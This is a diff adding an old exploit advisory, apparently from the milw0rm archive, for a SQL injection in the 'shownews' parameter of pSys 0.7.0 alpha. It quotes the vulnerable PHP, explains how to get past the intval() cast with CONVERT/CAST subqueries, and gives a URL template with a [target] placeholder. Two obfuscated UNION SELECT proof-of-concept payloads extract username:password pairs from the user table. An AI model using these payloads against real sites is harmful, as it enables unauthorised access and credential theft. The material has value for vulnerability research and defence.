@@ -1,0 +1,57 @@
+######################
+#
+#pSys - 0.7.0. alpha shownews SQL Injection
+#
+######################
+#
+#Bug by: h0yt3r
+#
+##
+###
+##
+#
+#Bug in here:
+#
+# if (isset($_REQUEST['shownews']) && $_REQUEST['shownews'] != "") {
+#    $sqlbefehl="Select titel from $tab_news Where id = '".intval($_REQUEST['shownews'])."'";
+#    $gettitel = mysql_query($sqlbefehl,$serverid);
+#    $news=mysql_fetch_array($gettitel);
+#    $pagetitle = $pset['systitle']." - ".htmlspecialchars($news['titel']);
+#    //Hit Count
+#    $sqlbefehl = "Update $tab_news Set Counter=Counter+1 Where id = '".intval($_REQUEST['shownews'])."'";
+#    @mysql_query($sqlbefehl,$serverid);
+# }
+#
+#
+#Ok, as we can see the script uses intval to convert the value of $shownews to an integer,
+#so a normal Select Injection would return nothing.
+#But it is still possible to inject and echo the right values using a simple CONVERT() or CAST() subquery.
+#Make sure that your subquery returns only one row by setting limit n,1.
+#
+#In standard configuration the table prefix is "ps_". But it also can be somethin like "powie_"
+#like it is set in version 0.69.
+#Remember that you can use information_schema.tables when mySQL Version >= 5 for finding prefixes and names.
+#
+#And by the way Powie uses a nice password encryption style, so have fun with it:
+#
+# if ($checkuser == 1) {
+#         srand((double)microtime() * 1000000);
+#         $newpass = md5(uniqid(rand()));
+#         $pwd = substr($newpass, 0, 10);
+# }
+#
+#SQL Injection:
+#http://[target]/[path]/news/index.php?shownews=[SQL+SUBQUERY]
+#
+#PoC:
+#/news/index.php?shownews=-1'UnIoN/**/SeLeCt/**/1,CoNvErT((SeLeCt/**/CoNcAt(username,0x3a,pwd)/**/FrOm/**/powie_pfuser/**/LiMit/**/0,1),ChAr(99)),3,4,5,6,7,8,9,10,11,12,13/*
+#/news/index.php?shownews=-1'UnIoN/**/SeLeCt/**/1,CaSt((SeLeCt/**/CoNcAt(username,0x3a,pwd)/**/FrOm/**/ps_pfuser/**/LiMit/**/0,1)/**/AS/**/ChAr),3,4,5,6,7,8,9,10,11,12,13/*
+#
+#######################
+#
+#Greetz to thund3r, b!zZ!t, ramon, Sys-Flaw, Free-Hack and the great h4ck-y0u Team!
+#
+#######################
+#######################
+
+# milw0rm.com [2008-06-05]
